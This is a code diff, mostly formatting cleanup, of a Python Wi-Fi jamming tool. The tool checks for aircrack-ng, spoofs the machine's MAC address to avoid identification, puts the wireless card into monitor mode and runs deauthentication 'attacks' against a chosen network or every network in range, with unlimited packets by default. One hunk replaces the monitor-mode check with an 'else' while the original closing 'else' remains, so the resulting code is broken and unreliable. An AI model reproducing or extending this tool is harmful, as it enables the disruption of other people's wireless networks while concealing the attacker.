@@ -43,12 +43,12 @@ def is_package_installed(*args):
         return True
     else:
         return False
-    
+
 def get_user_input():
     parse_object = optparse.OptionParser()
-    parse_object.add_option("-t","--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do not use this parameter!")
-    parse_object.add_option("-n","--number", dest="number_of_packages",type=int, default=0, help="How many packages will be sent to the target(s)!(default=0=unlimited)")
-    parse_object.add_option("-m","--mac",dest="mac_address",type=str, help="Temporary new MAC address.")
+    parse_object.add_option("-t", "--target", dest="targetname", type=str, help="Specific target name to be attacked!\nIf all then do not use this parameter!")
+    parse_object.add_option("-n", "--number", dest="number_of_packages", type=int, default=0, help="How many packages will be sent to the target(s)!(default=0=unlimited)")
+    parse_object.add_option("-m", "--mac", dest="mac_address", type=str, help="Temporary new MAC address.")
     parse_object.add_option("-q", "--quality", dest="quality_of_the_attack", type=int, default=1, help="Enter a number between 1 and 20. The higher the number, the higher the quality of the attack as well as the time taken!\n(default=1)")
 
     return parse_object.parse_args()
@@ -59,13 +59,13 @@ def change_mac_address(mac_address):
             re_eneable_managedmode(interface_name)
             time.sleep(5)
         interface_name = get_interface_name()
-        subprocess.call(["ifconfig", interface_name,"down"])
+        subprocess.call(["ifconfig", interface_name, "down"])
         time.sleep(1)
-        subprocess.call(["ifconfig", interface_name,"hw","ether", mac_address])
+        subprocess.call(["ifconfig", interface_name, "hw", "ether", mac_address])
         time.sleep(1)
-        subprocess.call(["ifconfig", interface_name,"up"])
+        subprocess.call(["ifconfig", interface_name, "up"])
         time.sleep(5)
-        
+
 def control_new_mac(interface_name):
     ifconfig = subprocess.check_output(["ifconfig", interface_name])
     print(ifconfig)
@@ -179,7 +179,7 @@ def drop(device_mac, network_mac, interface_name_monitor):
 def sleep(during):
     during += quality_of_the_attack * 1.5
     time.sleep(during)
-    
+
 def clean():
     os.system("rm -rf firstScan/o*")
     os.system("rm -rf secondScan/o*")
@@ -190,22 +190,19 @@ def re_eneable_managedmode(interface_name_monitor):
     os.system(f"airmon-ng stop {interface_name_monitor}")
 
 
-
-
-
 if is_package_installed("sqlite3", "aircrack-ng", "gnome-terminal", "net-tools"):
     print("All packages we need are installed.\n")
 else:
     exit("Stopped because of not-installed packages!\n")
 
-(user_input,arguments) = get_user_input()
+(user_input, arguments) = get_user_input()
 targetname, number_of_packages, mac_address, quality_of_the_attack = user_input.targetname, user_input.number_of_packages, user_input.mac_address, user_input.quality_of_the_attack
 
 if quality_of_the_attack < 1 or quality_of_the_attack > 20:
     exit("The quality value is NOT valid! Enter a number between 1 and 20! ")
 
 interface_name = get_interface_name()
-if not mac_address is None:
+if mac_address is not None:
     change_mac_address(mac_address)
 finalized_mac = control_new_mac(str(get_interface_name()))
 if finalized_mac == mac_address:
@@ -215,7 +212,7 @@ else:
     wanna_c = input("Wanna continue without changing your MAC address. This can be dangerous![Y/n]: ")
     if wanna_c == "n":
         exit("Stopped!")
-        
+
 print(f"\n\nOptions:\nTarget: {targetname} (None=all)\nPackage quantity: {number_of_packages}\nYour MAC address: {control_new_mac(get_interface_name())}")
 print(CRED + "\nAre you sure to start the attack with the above settings?[Y/n]" + CEND)
 sure = input("\n: ")
@@ -223,18 +220,14 @@ s = ["y", "Y", ""]
 if sure not in s:
     exit("Stopped!")
 
-
-
-
 clean()
 if not is_monitor():
     change_interface_mod(get_interface_name())
-
-if is_monitor():
+else:
     print("The mode has changed to monitor instead of managed.")
     interface_name_monitor = get_interface_name()
 
-    if targetname == None:
+    if targetname is None:
         print("All WIFI that the WIFI card can reach have been chosen as target!")
         time.sleep(1)
         # ALL SCAN
@@ -254,7 +247,7 @@ if is_monitor():
 
             name = str(names[i])
             name = name[2:-3]
-            print(CRED+ name + CEND)
+            print(CRED + name + CEND)
             bssid = str(targets[i])
             bssid = bssid[2:19]
             print(bssid)
@@ -297,7 +290,7 @@ if is_monitor():
     else:
         print(f"'{targetname}' has been chosen as target!")
         time.sleep(1)
-        ## FIRST SCAN
+        # FIRST SCAN
         scan_network(interface_name_monitor)
         files_first = os.listdir("./firstScan")
         number_of_files_first = len(files_first)
@@ -345,5 +338,4 @@ if is_monitor():
             print("Your network can usable now! Have a good one c:")
 
 else:
-    print("The mode has NOT changed to monitor instead of managed." + CRED +"\nYou should run it as root!" + CEND)
-
+    print("The mode has NOT changed to monitor instead of managed." + CRED + "\nYou should run it as root!" + CEND)
